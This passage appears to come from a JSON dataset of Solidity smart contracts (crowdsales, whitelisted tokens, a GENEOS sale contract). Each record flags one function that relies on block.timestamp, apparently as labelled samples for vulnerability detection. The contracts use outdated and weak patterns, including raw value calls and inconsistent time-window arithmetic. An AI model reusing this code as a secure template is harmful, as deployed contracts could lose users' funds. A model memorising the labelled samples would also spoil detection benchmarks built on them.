true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract MintedTokenCappedCrowdsaleExt is CrowdsaleExt {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsaleExt(\n string _name,\n address _token,\n PricingStrategy _pricingStrategy,\n address _multisigWallet,\n uint _start, uint _end,\n uint _minimumFundingGoal,\n uint _maximumSellableTokens,\n bool _isUpdatable,\n bool _isWhiteListed\n ) CrowdsaleExt(_name, _token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal, _isUpdatable, _isWhiteListed) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n event MaximumSellableTokensChanged(uint newMaximumSellableTokens);\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isBreakingInvestorCap(address addr, uint tokenAmount) public constant returns (bool limitBroken) {\n assert(isWhiteListed);\n uint maxCap = earlyParticipantWhitelist[addr].maxCap;\n return (tokenAmountOf[addr].plus(tokenAmount)) > maxCap;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function setMaximumSellableTokens(uint tokens) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n maximumSellableTokens = tokens;\n MaximumSellableTokensChanged(maximumSellableTokens);\n }\n function updateRate(uint newOneTokenInWei) public onlyOwner {\n assert(!finalized);\n assert(isUpdatable);\n assert(now <= startsAt);\n CrowdsaleExt lastTierCntrct = CrowdsaleExt(getLastTier());\n assert(!lastTierCntrct.finalized());\n pricingStrategy.updateRate(newOneTokenInWei);\n }\n function assignTokens(address receiver, uint tokenAmount) private {\n MintableTokenExt mintableToken = MintableTokenExt(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa5"
  },
  "filename": "9918.sol",
  "content": "pragma solidity ^0.4.11;\ncontract DSNote {\n event LogNote(\n bytes4 indexed sig,\n address indexed guy,\n bytes32 indexed foo,\n bytes32 indexed bar,\n uint wad,\n bytes fax\n ) anonymous;\n modifier note {\n bytes32 foo;\n bytes32 bar;\n assembly {\n foo := calldataload(4)\n bar := calldataload(36)\n }\n LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\n _;\n }\n}\ncontract ERC20 {\n function totalSupply() constant returns (uint supply);\n function balanceOf( address who ) constant returns (uint value);\n function allowance( address owner, address spender ) constant returns (uint _allowance);\n function transfer( address to, uint value) returns (bool ok);\n function transferFrom( address from, address to, uint value) returns (bool ok);\n function approve( address spender, uint value ) returns (bool ok);\n event Transfer( address indexed from, address indexed to, uint value);\n event Approval( address indexed owner, address indexed spender, uint value);\n}\ncontract DSAuthority {\n function canCall(\n address src, address dst, bytes4 sig\n ) constant returns (bool);\n}\ncontract DSAuthEvents {\n event LogSetAuthority (address indexed authority);\n event LogSetOwner (address indexed owner);\n}\ncontract DSAuth is DSAuthEvents {\n DSAuthority public authority;\n address public owner;\n function DSAuth() {\n owner = msg.sender;\n LogSetOwner(msg.sender);\n }\n function setOwner(address owner_)\n auth\n {\n owner = owner_;\n LogSetOwner(owner);\n }\n function setAuthority(DSAuthority authority_)\n auth\n {\n authority = authority_;\n LogSetAuthority(authority);\n }\n modifier auth {\n assert(isAuthorized(msg.sender, msg.sig));\n _;\n }\n modifier authorized(bytes4 sig) {\n assert(isAuthorized(msg.sender, sig));\n _;\n }\n function isAuthorized(address src, bytes4 sig) internal returns (bool) {\n if (src == address(this)) {\n return true;\n } else if (src == owner) {\n return true;\n } else if (authority == DSAuthority(0)) {\n return false;\n } else {\n return authority.canCall(src, this, sig);\n }\n }\n function assert(bool x) internal {\n if (!x) throw;\n }\n}\ncontract DSExec {\n function tryExec( address target, bytes calldata, uint value)\n internal\n returns (bool call_ret)\n {\n return target.call.value(value)(calldata);\n }\n function exec( address target, bytes calldata, uint value)\n internal\n {\n if(!tryExec(target, calldata, value)) {\n throw;\n }\n }\n function exec( address t, bytes c )\n internal\n {\n exec(t, c, 0);\n }\n function exec( address t, uint256 v )\n internal\n {\n bytes memory c; exec(t, c, v);\n }\n function tryExec( address t, bytes c )\n internal\n returns (bool)\n {\n return tryExec(t, c, 0);\n }\n function tryExec( address t, uint256 v )\n internal\n returns (bool)\n {\n bytes memory c; return tryExec(t, c, v);\n }\n}\ncontract DSMath {\n function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x + y) >= x);\n }\n function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x - y) <= x);\n }\n function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\n assert((z = x * y) >= x);\n }\n function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\n z = x / y;\n }\n function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x <= y ? x : y;\n }\n function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\n return x >= y ? x : y;\n }\n function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x + y) >= x);\n }\n function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x - y) <= x);\n }\n function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n assert((z = x * y) >= x);\n }\n function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = x / y;\n }\n function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x <= y ? x : y;\n }\n function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\n return x >= y ? x : y;\n }\n function imin(int256 x, int256 y) constant internal returns (int256 z) {\n return x <= y ? x : y;\n }\n function imax(int256 x, int256 y) constant internal returns (int256 z) {\n return x >= y ? x : y;\n }\n uint128 constant WAD = 10 ** 18;\n function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + WAD / 2) / WAD);\n }\n function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * WAD + y / 2) / y);\n }\n function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n uint128 constant RAY = 10 ** 27;\n function radd(uint128 x, uint128 y) constant internal returns (uint128) {\n return hadd(x, y);\n }\n function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\n return hsub(x, y);\n }\n function rmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * y + RAY / 2) / RAY);\n }\n function rdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\n z = cast((uint256(x) * RAY + y / 2) / y);\n }\n function rpow(uint128 x, uint64 n) constant internal returns (uint128 z) {\n z = n % 2 != 0 ? x : RAY;\n for (n /= 2; n != 0; n /= 2) {\n x = rmul(x, x);\n if (n % 2 != 0) {\n z = rmul(z, x);\n }\n }\n }\n function rmin(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmin(x, y);\n }\n function rmax(uint128 x, uint128 y) constant internal returns (uint128) {\n return hmax(x, y);\n }\n function cast(uint256 x) constant internal returns (uint128 z) {\n assert((z = uint128(x)) == x);\n }\n}\ncontract DSStop is DSAuth, DSNote {\n bool public stopped;\n modifier stoppable {\n assert (!stopped);\n _;\n }\n function stop() auth note {\n stopped = true;\n }\n function start() auth note {\n stopped = false;\n }\n}\ncontract DSTokenBase is ERC20, DSMath {\n uint256 _supply;\n mapping (address => uint256) _balances;\n mapping (address => mapping (address => uint256)) _approvals;\n function DSTokenBase(uint256 supply) {\n _balances[msg.sender] = supply;\n _supply = supply;\n }\n function totalSupply() constant returns (uint256) {\n return _supply;\n }\n function balanceOf(address src) constant returns (uint256) {\n return _balances[src];\n }\n function allowance(address src, address guy) constant returns (uint256) {\n return _approvals[src][guy];\n }\n function transfer(address dst, uint wad) returns (bool) {\n assert(_balances[msg.sender] >= wad);\n _balances[msg.sender] = sub(_balances[msg.sender], wad);\n _balances[dst] = add(_balances[dst], wad);\n Transfer(msg.sender, dst, wad);\n return true;\n }\n function transferFrom(address src, address dst, uint wad) returns (bool) {\n assert(_balances[src] >= wad);\n assert(_approvals[src][msg.sender] >= wad);\n _approvals[src][msg.sender] = sub(_approvals[src][msg.sender], wad);\n _balances[src] = sub(_balances[src], wad);\n _balances[dst] = add(_balances[dst], wad);\n Transfer(src, dst, wad);\n return true;\n }\n function approve(address guy, uint256 wad) returns (bool) {\n _approvals[msg.sender][guy] = wad;\n Approval(msg.sender, guy, wad);\n return true;\n }\n}\ncontract WhiteList {\n mapping (address => bool) public whiteList;\n address public owner;\n function WhiteList() public {\n owner = msg.sender;\n whiteList[owner] = true;\n }\n function addToWhiteList(address [] _addresses) public {\n require(msg.sender == owner);\n for (uint i = 0; i < _addresses.length; i++) {\n whiteList[_addresses[i]] = true;\n }\n }\n function removeFromWhiteList(address [] _addresses) public {\n require (msg.sender == owner);\n for (uint i = 0; i < _addresses.length; i++) {\n whiteList[_addresses[i]] = false;\n }\n }\n}\ncontract DSToken is DSTokenBase(0), DSStop {\n bytes32 public symbol = \"GENEOS\";\n uint256 public decimals = 18;\n WhiteList public wlcontract;\n function DSToken(WhiteList wlc_) {\n require(msg.sender == wlc_.owner());\n wlcontract = wlc_;\n }\n function transfer(address dst, uint wad) stoppable note returns (bool) {\n require(wlcontract.whiteList(msg.sender));\n require(wlcontract.whiteList(dst));\n return super.transfer(dst, wad);\n }\n function transferFrom(\n address src, address dst, uint wad\n ) stoppable note returns (bool) {\n require(wlcontract.whiteList(src));\n require(wlcontract.whiteList(dst));\n return super.transferFrom(src, dst, wad);\n }\n function approve(address guy, uint wad) stoppable note returns (bool) {\n require(wlcontract.whiteList(msg.sender));\n require(wlcontract.whiteList(guy));\n return super.approve(guy, wad);\n }\n function push(address dst, uint128 wad) returns (bool) {\n return transfer(dst, wad);\n }\n function pull(address src, uint128 wad) returns (bool) {\n return transferFrom(src, msg.sender, wad);\n }\n function mint(uint128 wad) auth stoppable note {\n require(wlcontract.whiteList(msg.sender));\n _balances[msg.sender] = add(_balances[msg.sender], wad);\n _supply = add(_supply, wad);\n }\n function burn(uint128 wad) auth stoppable note {\n require(wlcontract.whiteList(msg.sender));\n _balances[msg.sender] = sub(_balances[msg.sender], wad);\n _supply = sub(_supply, wad);\n }\n bytes32 public name = \"\";\n function setName(bytes32 name_) auth {\n name = name_;\n }\n}\ncontract GENEOSSale is DSAuth, DSExec, DSMath {\n DSToken public GENEOS;\n uint128 public totalSupply = 1000000000000000000000000000;\n uint128 public foundersAllocation = 100000000000000000000000000;\n string public foundersKey = \"Dev key\";\n uint public createLastDay = 200000000000000000000000000;\n uint public createPerDay = 4000000000000000000000000;\n uint public numberOfDays = 175;\n uint public startTime;\n uint public finalWindowTime;\n uint public finishTime;\n address public foundersAddress = 0x37048f9C92a41fcE4535FDE3022B887b34D7eC0E;\n mapping (uint => uint) public dailyTotals;\n mapping (uint => mapping (address => uint)) public userBuys;\n mapping (uint => mapping (address => bool)) public claimed;\n mapping (address => string) public keys;\n event LogBuy (uint window, address user, uint amount);\n event LogClaim (uint window, address user, uint amount);\n event LogRegister (address user, string key);\n event LogCollect (uint amount);\n event LogFreeze ();\n function GENEOSSale(\n uint _startTime\n ) {\n startTime = _startTime;\n finalWindowTime = startTime + (numberOfDays * 20 minutes);\n finishTime = finalWindowTime + 5 hours;\n }\n function initialize(DSToken geneos) auth {\n assert(address(GENEOS) == address(0));\n assert(geneos.owner() == address(this));\n assert(geneos.authority() == DSAuthority(0));\n assert(geneos.totalSupply() == 0);\n GENEOS = geneos;\n GENEOS.mint(totalSupply);\n GENEOS.push(foundersAddress, foundersAllocation);\n keys[foundersAddress] = foundersKey;\n LogRegister(foundersAddress, foundersKey);\n }\n function time() constant returns (uint) {\n return block.timestamp;\n }\n function today() constant returns (uint) {\n return dayFor(time());\n }\n function dayFor(uint timestamp) constant returns (uint) {\n if (timestamp < startTime) {\n return 0;\n }\n if (timestamp >= startTime && timestamp < finalWindowTime) {\n return sub(timestamp, startTime) / 5 minutes + 1;\n }\n if (timestamp >= finalWindowTime && timestamp < finishTime) {\n return 176;\n }\n return 999;\n }\n function createOnDay(uint day) constant returns (uint) {\n assert(day >= 1 && day <= 176);\n return day == 176 ? createLastDay : createPerDay;\n }\n function buyWithLimit(uint day, uint limit) payable {\n assert(today() > 0 && today() <= numberOfDays + 1);\n assert(msg.value >= 0.01 ether);\n assert(day >= today());\n assert(day <= numberOfDays + 1);\n userBuys[day][msg.sender] += msg.value;\n dailyTotals[day] += msg.value;\n if (limit != 0) {\n assert(dailyTotals[day] <= limit);\n }\n LogBuy(day, msg.sender, msg.value);\n }\n function buy() payable {\n buyWithLimit(today(), 0);\n }\n function () payable {\n buy();\n }\n function claim(uint day) {\n assert(today() > day);\n if (claimed[day][msg.sender] || dailyTotals[day] == 0) {\n return;\n }\n var dailyTotal = cast(dailyTotals[day]);\n var userTotal = cast(userBuys[day][msg.sender]);\n var price = wdiv(cast(createOnDay(day)), dailyTotal);\n var reward = wmul(price, userTotal);\n claimed[day][msg.sender] = true;\n GENEOS.push(msg.sender, reward);\n LogClaim(day, msg.sender, reward);\n }\n function claimAll() {\n for (uint i = 0; i < today(); i++) {\n claim(i);\n }\n }\n function register(string key) {\n assert(today() <= numberOfDays + 1);\n assert(bytes(key).length <= 64);\n keys[msg.sender] = key;\n LogRegister(msg.sender, key);\n }\n function collect() auth {\n assert(today() > 0);\n exec(msg.sender, this.balance);\n LogCollect(this.balance);\n }\n function freeze() {\n assert(time() > finishTime);\n GENEOS.stop();\n LogFreeze();\n }\n}",
  "extract_feature": [
    "function time() constant returns (uint) {\nreturn block.timestamp;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa6"
  },
  "filename": "9943.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value > 0 && _value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping(address => mapping(address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value > 0 && _value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public{\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\ncontract PausableToken is StandardToken, Pausable {\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(address _spender, uint256 _value) public whenNotPaused returns (bool) {\n return super.approve(_spender, _value);\n }\n function batchTransfer(address[] _receivers, uint256 _value) public onlyOwner whenNotPaused returns (bool) {\n uint cnt = _receivers.length;\n uint256 amount = _value.mul(uint256(cnt));\n require(cnt > 0 && cnt <= 20);\n require(_value > 0 && balances[msg.sender] >= amount);\n balances[msg.sender] = balances[msg.sender].sub(amount);\n for (uint i = 0; i < cnt; i++) {\n balances[_receivers[i]] = balances[_receivers[i]].add(_value);\n emit Transfer(msg.sender, _receivers[i], _value);\n }\n return true;\n }\n}\ncontract UvtToken is PausableToken {\n uint256 public tokenDestroyed;\n address public devTeam;\n address public investor;\n address public ecoBuilder;\n event Burn(address indexed _from, uint256 _tokenDestroyed, uint256 _timestamp);\n function initializeSomeAddress(address newDevTeam, address newInvestor, address newEcoBuilder) onlyOwner public {\n require(newDevTeam != address(0) && newInvestor != address(0) && newEcoBuilder != address(0));\n require(devTeam == 0x0 && investor == 0x0 && ecoBuilder == 0x0);\n devTeam = newDevTeam;\n investor = newInvestor;\n ecoBuilder = newEcoBuilder;\n }\n function burn(uint256 _burntAmount) onlyOwner public returns (bool success) {\n require(balances[msg.sender] >= _burntAmount && _burntAmount > 0);\n balances[msg.sender] = balances[msg.sender].sub(_burntAmount);\n totalSupply = totalSupply.sub(_burntAmount);\n tokenDestroyed = tokenDestroyed.add(_burntAmount);\n require(tokenDestroyed < 10000000000 * (10 ** (uint256(decimals))));\n emit Transfer(address(this), 0x0, _burntAmount);\n emit Burn(msg.sender, _burntAmount, block.timestamp);\n return true;\n }\n string public name = \"User Value Token\";\n string public symbol = \"UVT\";\n string public version = '1.0.0';\n uint8 public decimals = 18;\n constructor() public{\n totalSupply = 10000000000 * (10 ** (uint256(decimals)));\n balances[msg.sender] = totalSupply;\n }\n function transfer(address _to, uint256 _value) public whenNotPaused returns (bool) {\n if (devTeam != 0x0 && _to == devTeam)\n {\n require(balances[_to].add(_value) <= totalSupply.div(5));\n }\n if (investor != 0x0 && _to == investor)\n {\n require(balances[_to].add(_value) <= totalSupply.div(5));\n }\n if (ecoBuilder != 0x0 && _to == ecoBuilder)\n {\n require(balances[_to].add(_value) <= totalSupply.div(5));\n }\n return super.transfer(_to, _value);\n }\n}",
  "extract_feature": [
    "function burn(uint256 _burntAmount) onlyOwner public returns (bool success) {\nrequire(balances[msg.sender] >= _burntAmount && _burntAmount > 0);\nbalances[msg.sender] = balances[msg.sender].sub(_burntAmount);\ntotalSupply = totalSupply.sub(_burntAmount);\ntokenDestroyed = tokenDestroyed.add(_burntAmount);\nrequire(tokenDestroyed < 10000000000 * (10 ** (uint256(decimals))));\nemit Transfer(address(this), 0x0, _burntAmount);\nemit Burn(msg.sender, _burntAmount, block.timestamp);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa7"
  },
  "filename": "9967.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract TokenlessCrowdsale {\n using SafeMath for uint256;\n address public wallet;\n uint256 public weiRaised;\n event SaleContribution(address indexed purchaser, address indexed beneficiary, uint256 value);\n constructor (address _wallet) public {\n require(_wallet != address(0));\n wallet = _wallet;\n }\n function () external payable {\n buyTokens(msg.sender);\n }\n function buyTokens(address _beneficiary) public payable {\n uint256 weiAmount = msg.value;\n _preValidatePurchase(_beneficiary, weiAmount);\n weiRaised = weiRaised.add(weiAmount);\n _processPurchaseInWei(_beneficiary, weiAmount);\n emit SaleContribution(\n msg.sender,\n _beneficiary,\n weiAmount\n );\n _updatePurchasingState(_beneficiary, weiAmount);\n _forwardFunds();\n _postValidatePurchase(_beneficiary, weiAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n require(_beneficiary != address(0));\n require(_weiAmount != 0);\n }\n function _postValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _processPurchaseInWei(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n }\n function _forwardFunds() internal {\n wallet.transfer(msg.value);\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract WhitelistedAICrowdsale is TokenlessCrowdsale, Ownable {\n using SafeMath for uint256;\n mapping(address => bool) public accredited;\n mapping(address => uint256) public contributions;\n mapping(address => uint256) public caps;\n function isWhitelisted(address _beneficiary) public view returns (bool) {\n if (caps[_beneficiary] != 0) {\n return true;\n }\n return false;\n }\n function addToWhitelist(address _beneficiary, uint256 _cap, bool _accredited) external onlyOwner {\n caps[_beneficiary] = _cap;\n accredited[_beneficiary] = _accredited;\n }\n function removeFromWhitelist(address _beneficiary) external onlyOwner {\n caps[_beneficiary] = 0;\n accredited[_beneficiary] = false;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n require(contributions[_beneficiary].add(_weiAmount) <= caps[_beneficiary]);\n }\n function _updatePurchasingState(address _beneficiary, uint256 _weiAmount) internal {\n super._updatePurchasingState(_beneficiary, _weiAmount);\n contributions[_beneficiary] = contributions[_beneficiary].add(_weiAmount);\n }\n}\ncontract FiatCappedCrowdsale is TokenlessCrowdsale, Ownable {\n using SafeMath for uint256;\n uint256 public millCap;\n uint256 public millRaised;\n uint256 public minMillPurchase;\n uint256 public millWeiRate;\n uint256 public millLeconteRate;\n uint256 constant minMillWeiRate = (10 ** 18) / (5000 * (10 ** 3));\n uint256 constant maxMillWeiRate = (10 ** 18) / (100 * (10 ** 3));\n uint256 constant minMillLeconteRate = (10 ** 18) / 1000;\n uint256 constant maxMillLeconteRate = (10 ** 18) / 10;\n modifier isSaneETHRate(uint256 _millWeiRate) {\n require(_millWeiRate >= minMillWeiRate);\n require(_millWeiRate <= maxMillWeiRate);\n _;\n }\n modifier isSaneSPXRate(uint256 _millLeconteRate) {\n require(_millLeconteRate >= minMillLeconteRate);\n require(_millLeconteRate <= maxMillLeconteRate);\n _;\n }\n constructor (\n uint256 _millCap,\n uint256 _minMillPurchase,\n uint256 _millLeconteRate,\n uint256 _millWeiRate\n ) public isSaneSPXRate(_millLeconteRate) isSaneETHRate(_millWeiRate) {\n require(_millCap > 0);\n require(_minMillPurchase > 0);\n millCap = _millCap;\n minMillPurchase = _minMillPurchase;\n millLeconteRate = _millLeconteRate;\n millWeiRate = _millWeiRate;\n }\n function capReached() public view returns (bool) {\n return millRaised >= millCap;\n }\n function setWeiRate(uint256 _millWeiRate) external onlyOwner isSaneETHRate(_millWeiRate) {\n millWeiRate = _millWeiRate;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n uint256 _millAmount = _toMill(_weiAmount);\n require(_millAmount >= minMillPurchase);\n uint256 _millRaised = millRaised.add(_millAmount);\n require(_millRaised <= millCap);\n millRaised = _millRaised;\n }\n function _toMill(uint256 _weiAmount) internal returns (uint256) {\n return _weiAmount.div(millWeiRate);\n }\n function _toLeconte(uint256 _weiAmount) internal returns (uint256) {\n return _toMill(_weiAmount).mul(millLeconteRate);\n }\n}\ncontract PausableCrowdsale is TokenlessCrowdsale, Ownable {\n bool public open = true;\n modifier saleIsOpen() {\n require(open);\n _;\n }\n function unpauseSale() external onlyOwner {\n require(!open);\n open = true;\n }\n function pauseSale() external onlyOwner saleIsOpen {\n open = false;\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal saleIsOpen {\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract BasicERC223Receiver {\n function tokenFallback(address _from, uint256 _value, bytes _data) public pure;\n}\ncontract RestrictedToken is BasicToken, Ownable {\n string public name;\n string public symbol;\n uint8 public decimals;\n address public issuer;\n uint256 public vestingPeriod;\n mapping(address => bool) public authorizedRecipients;\n mapping(address => bool) public erc223Recipients;\n mapping(address => uint256) public lastIssuedTime;\n event Issue(address indexed to, uint256 value);\n modifier onlyIssuer() {\n require(msg.sender == issuer);\n _;\n }\n modifier isAuthorizedRecipient(address _recipient) {\n require(authorizedRecipients[_recipient]);\n _;\n }\n constructor (\n uint256 _supply,\n string _name,\n string _symbol,\n uint8 _decimals,\n uint256 _vestingPeriod,\n address _owner,\n address _issuer\n ) public {\n require(_supply != 0);\n require(_owner != address(0));\n require(_issuer != address(0));\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n vestingPeriod = _vestingPeriod;\n owner = _owner;\n issuer = _issuer;\n totalSupply_ = _supply;\n balances[_issuer] = _supply;\n emit Transfer(address(0), _issuer, _supply);\n }\n 